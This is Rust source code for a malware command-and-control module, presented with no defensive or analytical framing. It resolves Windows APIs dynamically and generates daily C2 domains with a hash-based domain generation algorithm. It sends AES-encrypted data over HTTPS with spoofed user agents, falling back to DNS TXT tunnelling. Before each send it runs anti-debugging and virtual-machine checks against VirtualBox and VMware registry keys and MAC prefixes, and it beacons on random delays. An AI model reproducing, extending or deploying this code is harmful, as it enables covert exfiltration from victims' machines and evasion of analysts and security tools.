#![allow(non_snake_case)]

use std::{
    collections::VecDeque,
    ffi::{c_void, CString},
    net::UdpSocket,
    ptr::{null_mut},
    sync::{
        atomic::{AtomicBool, Ordering},
    },
    thread,
    time::Duration,
};

use aes::Aes256;
use base32;
use block_modes::{block_padding::Pkcs7, BlockMode, Cbc};
use chrono::Utc;
use rand::{thread_rng, Rng};
use reqwest::blocking::Client;
use reqwest::header::{HeaderMap, USER_AGENT};
use sha2::{Digest, Sha256};
use winapi::{
    shared::{minwindef::{DWORD, FARPROC, HMODULE, LPVOID}, ntdef::HANDLE},
    um::{
        libloaderapi::{GetModuleHandleA, GetProcAddress},
        winnt::{KEY_READ, KEY_WOW64_64KEY},
    },
};

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

static IS_RUNNING: AtomicBool = AtomicBool::new(true);

struct ApiResolver {
    kernel32: HMODULE,
    advapi32: HMODULE,
    iphlpapi: HMODULE,
    Sleep: Option<unsafe extern "system" fn(DWORD)>,
    GetTickCount64: Option<unsafe extern "system" fn() -> u64>,
    RegOpenKeyExA: Option<unsafe extern "system" fn(HANDLE, *const i8, DWORD, DWORD, *mut HANDLE) -> i32>,
    RegCloseKey: Option<unsafe extern "system" fn(HANDLE) -> i32>,
    GetAdaptersInfo: Option<unsafe extern "system" fn(*mut c_void, *mut u32) -> u32>,
}

impl ApiResolver {
    fn new() -> Self {
        unsafe {
            Self {
                kernel32: GetModuleHandleA(CString::new("kernel32.dll").unwrap().as_ptr()),
                advapi32: GetModuleHandleA(CString::new("advapi32.dll").unwrap().as_ptr()),
                iphlpapi: GetModuleHandleA(CString::new("iphlpapi.dll").unwrap().as_ptr()),
                Sleep: None,
                GetTickCount64: None,
                RegOpenKeyExA: None,
                RegCloseKey: None,
                GetAdaptersInfo: None,
            }
        }
    }
    unsafe fn resolve(&self, module: HMODULE, name: &str) -> Option<FARPROC> {
        if module.is_null() {
            None
        } else {
            let cname = CString::new(name).unwrap();
            let proc = GetProcAddress(module, cname.as_ptr());
            if proc.is_null() { None } else { Some(proc) }
        }
    }
    unsafe fn init(&mut self) {
        self.Sleep = self.resolve(self.kernel32, "Sleep").map(|f| std::mem::transmute(f));
        self.GetTickCount64 = self.resolve(self.kernel32, "GetTickCount64").map(|f| std::mem::transmute(f));
        self.RegOpenKeyExA = self.resolve(self.advapi32, "RegOpenKeyExA").map(|f| std::mem::transmute(f));
        self.RegCloseKey = self.resolve(self.advapi32, "RegCloseKey").map(|f| std::mem::transmute(f));
        self.GetAdaptersInfo = self.resolve(self.iphlpapi, "GetAdaptersInfo").map(|f| std::mem::transmute(f));
    }
    unsafe fn sleep(&self, ms: u32) {
        if let Some(func) = self.Sleep {
            func(ms);
        }
    }
    unsafe fn get_tick_count64(&self) -> u64 {
        if let Some(func) = self.GetTickCount64 {
            func()
        } else {
            0
        }
    }
    unsafe fn reg_open_key_ex_a(&self, hkey: HANDLE, sub_key: &str, options: u32, sam_desired: u32, phk_result: *mut HANDLE) -> i32 {
        if let Some(func) = self.RegOpenKeyExA {
            let c_sub_key = CString::new(sub_key).unwrap();
            func(hkey, c_sub_key.as_ptr(), options, sam_desired, phk_result)
        } else {
            -1
        }
    }
    unsafe fn reg_close_key(&self, hkey: HANDLE) -> i32 {
        if let Some(func) = self.RegCloseKey {
            func(hkey)
        } else {
            -1
        }
    }
    unsafe fn get_adapters_info(&self, pAdapterInfo: *mut c_void, pOutBufLen: *mut u32) -> u32 {
        if let Some(func) = self.GetAdaptersInfo {
            func(pAdapterInfo, pOutBufLen)
        } else {
            1 // ERROR_INVALID_FUNCTION
        }
    }
}

fn generate_key_iv(secret: &[u8]) -> ([u8; 32], [u8; 16]) {
    let mut hasher = Sha256::new();
    hasher.update(secret);
    let hash = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&hash);
    let mut iv = [0u8; 16];
    iv.copy_from_slice(&hash[..16]);
    (key, iv)
}

fn encrypt(data: &[u8], key: &[u8], iv: &[u8]) -> Vec<u8> {
    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
    cipher.encrypt_vec(data)
}

fn decrypt(data: &[u8], key: &[u8], iv: &[u8]) -> Option<Vec<u8>> {
    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
    cipher.decrypt_vec(data).ok()
}

fn random_user_agent() -> String {
    let agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/92.0.4515.159 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/92.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/85.0.4183.121 Safari/537.36",
    ];
    let idx = thread_rng().gen_range(0..agents.len());
    agents[idx].to_string()
}

fn build_headers() -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT, random_user_agent().parse().unwrap());
    headers.insert("X-Custom-Header", "random-val-1234".parse().unwrap());
    headers
}

fn random_delay(api_resolver: &ApiResolver, min_ms: u64, max_ms: u64) {
    let delay = thread_rng().gen_range(min_ms..max_ms);
    unsafe { api_resolver.sleep(delay as u32); }
}

fn generate_c2_domain(seed: &str) -> String {
    let date_str = Utc::now().format("%Y%m%d").to_string();
    let base = format!("{}{}", seed, date_str);
    let hashed = Sha256::digest(base.as_bytes());
    let mut domain = String::new();
    for b in &hashed[0..8] {
        domain.push_str(&format!("{:02x}", b));
    }
    domain.push_str(".com");
    domain
}

fn https_post(url: &str, data: &[u8]) -> Option<Vec<u8>> {
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .ok()?;
    let headers = build_headers();
    let resp = client.post(url).headers(headers).body(data.to_vec()).send().ok()?;
    if resp.status().is_success() {
        resp.bytes().ok().map(|b| b.to_vec())
    } else {
        None
    }
}

fn dns_encode(data: &[u8]) -> String {
    base32::encode(base32::Alphabet::RFC4648 { padding: false }, data)
        .chars()
        .collect::<Vec<_>>()
        .chunks(15)
        .map(|chunk| chunk.iter().collect::<String>())
        .collect::<Vec<_>>()
        .join(".") + ".example.com"
}

fn build_dns_query(domain: &str) -> Vec<u8> {
    let mut packet = Vec::with_capacity(512);
    let transaction_id: u16 = thread_rng().gen();
    packet.push((transaction_id >> 8) as u8);
    packet.push(transaction_id as u8);
    packet.extend_from_slice(&[0x01, 0x00]); // standard query
    packet.extend_from_slice(&[0x00, 0x01]); // one question
    packet.extend_from_slice(&[0x00, 0x00]); // no answer
    packet.extend_from_slice(&[0x00, 0x00]); // no authority
    packet.extend_from_slice(&[0x00, 0x00]); // no additional

    for part in domain.split('.') {
        packet.push(part.len() as u8);
        packet.extend_from_slice(part.as_bytes());
    }
    packet.push(0x00); // end domain

    packet.extend_from_slice(&[0x00, 0x10]); // QTYPE = TXT
    packet.extend_from_slice(&[0x00, 0x01]); // QCLASS = IN
    packet
}

fn parse_dns_response(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 12 { return None; }
    let answer_count = ((data[6] as u16) << 8) | data[7] as u16;
    if answer_count == 0 { return None; }

    let mut offset = 12;
    // skip question section
    while offset < data.len() {
        let len = data[offset] as usize;
        if len == 0 { offset += 1; break; }
        offset += len + 1;
    }
    offset += 4; // type + class

    for _ in 0..answer_count {
        if offset + 11 > data.len() { break; }
        let typ = ((data[offset + 2] as u16) << 8) | data[offset + 3] as u16;
        let data_len = ((data[offset + 8] as u16) << 8) | data[offset + 9] as u16;
        offset += 10;
        if typ == 16 { // TXT record
            if offset + data_len as usize > data.len() { break; }
            let txt_len = data[offset] as usize;
            if txt_len + 1 > data_len as usize { break; }
            let txt_data = &data[offset + 1..offset + 1 + txt_len];
            return Some(txt_data.to_vec());
        }
        offset += data_len as usize;
    }
    None
}

fn dns_query(domain: &str, server: &str) -> Option<Vec<u8>> {
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.set_read_timeout(Some(Duration::from_secs(3))).ok()?;
    socket.connect(server).ok()?;

    let query = build_dns_query(domain);
    socket.send(&query).ok()?;

    let mut buf = [0u8; 512];
    let size = socket.recv(&mut buf).ok()?;

    parse_dns_response(&buf[..size])
}

pub struct Comms {
    c2_seed: String,
    c2_dns_server: String,
    encryption_key: [u8; 32],
    encryption_iv: [u8; 16],
    recv_queue: VecDeque<Vec<u8>>,
    api_resolver: ApiResolver,
}

impl Comms {
    pub fn new(c2_seed: &str, c2_dns_server: &str, secret: &[u8]) -> Self {
        let (key, iv) = generate_key_iv(secret);
        let mut api_resolver = ApiResolver::new();
        unsafe { api_resolver.init(); }
        Self {
            c2_seed: c2_seed.to_string(),
            c2_dns_server: c2_dns_server.to_string(),
            encryption_key: key,
            encryption_iv: iv,
            recv_queue: VecDeque::new(),
            api_resolver,
        }
    }

    fn anti_debug_delay(&self) {
        unsafe {
            let start = self.api_resolver.get_tick_count64();
            self.api_resolver.sleep(15);
            let elapsed = self.api_resolver.get_tick_count64() - start;
            if elapsed < 14 {
                self.api_resolver.sleep(5000);
            }
        }
    }

    fn check_vm_registry(&self) -> bool {
        unsafe {
            let mut hkey = null_mut();
            let vbox = self.api_resolver.reg_open_key_ex_a(
                0x80000002, // HKEY_LOCAL_MACHINE
                "SYSTEM\\ControlSet001\\Services\\VBoxService",
                0,
                KEY_READ | KEY_WOW64_64KEY,
                &mut hkey,
            );
            if vbox == 0 {
                self.api_resolver.reg_close_key(hkey);
                return true;
            }
            let vmhgfs = self.api_resolver.reg_open_key_ex_a(
                0x80000002,
                "SYSTEM\\ControlSet001\\Services\\vmhgfs",
                0,
                KEY_READ | KEY_WOW64_64KEY,
                &mut hkey,
            );
            if vmhgfs == 0 {
                self.api_resolver.reg_close_key(hkey);
                return true;
            }
            false
        }
    }

    fn check_vm_mac(&self) -> bool {
        use winapi::shared::ipifcons::{MAX_ADAPTER_DESCRIPTION_LENGTH, MAX_ADAPTER_NAME_LENGTH, MAX_ADAPTER_ADDRESS_LENGTH};
        use winapi::shared::iphlpapi::{IP_ADAPTER_INFO, GetAdaptersInfo};

        unsafe {
            let mut buf_len: u32 = 0;
            self.api_resolver.get_adapters_info(null_mut(), &mut buf_len);
            if buf_len == 0 { return false; }
            let mem = libc::malloc(buf_len as usize);
            if mem.is_null() { return false; }
            let res = self.api_resolver.get_adapters_info(mem, &mut buf_len);
            if res != 0 {
                libc::free(mem);
                return false;
            }
            let mut ptr = mem as *mut IP_ADAPTER_INFO;
            while !ptr.is_null() {
                let mac = (*ptr).Address;
                if (mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69)
                    || (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29)
                    || (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0x14)
                    || (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56)
                {
                    libc::free(mem);
                    return true;
                }
                ptr = (*ptr).Next;
            }
            libc::free(mem);
            false
        }
    }

    fn anti_debug_checks(&self) -> bool {
        if self.check_vm_registry() { return true; }
        if self.check_vm_mac() { return true; }
        false
    }

    pub fn send_data_https(&mut self, data: &[u8]) -> Option<Vec<u8>> {
        self.anti_debug_delay();
        if self.anti_debug_checks() { return None; }
        let encrypted = encrypt(data, &self.encryption_key, &self.encryption_iv);
        let domain = generate_c2_domain(&self.c2_seed);
        let url = format!("https://{}/api/submit", domain);
        https_post(&url, &encrypted)
            .and_then(|resp| decrypt(&resp, &self.encryption_key, &self.encryption_iv))
    }

    pub fn send_data_dns(&mut self, data: &[u8]) -> Option<Vec<u8>> {
        self.anti_debug_delay();
        if self.anti_debug_checks() { return None; }
        let encrypted = encrypt(data, &self.encryption_key, &self.encryption_iv);
        let domain = dns_encode(&encrypted);
        dns_query(&domain, &self.c2_dns_server)
            .and_then(|resp| decrypt(&resp, &self.encryption_key, &self.encryption_iv))
    }

    pub fn send_data_fallback(&mut self, data: &[u8]) -> Option<Vec<u8>> {
        if let Some(resp) = self.send_data_https(data) {
            Some(resp)
        } else if let Some(resp) = self.send_data_dns(data) {
            Some(resp)
        } else {
            None
        }
    }

    pub fn run(&mut self) {
        while IS_RUNNING.load(Ordering::Relaxed) {
            if let Some(cmd) = self.recv_queue.pop_front() {
                let _ = self.send_data_fallback(&cmd);
            }
            random_delay(&self.api_resolver, 5000, 15000);
        }
    }
}
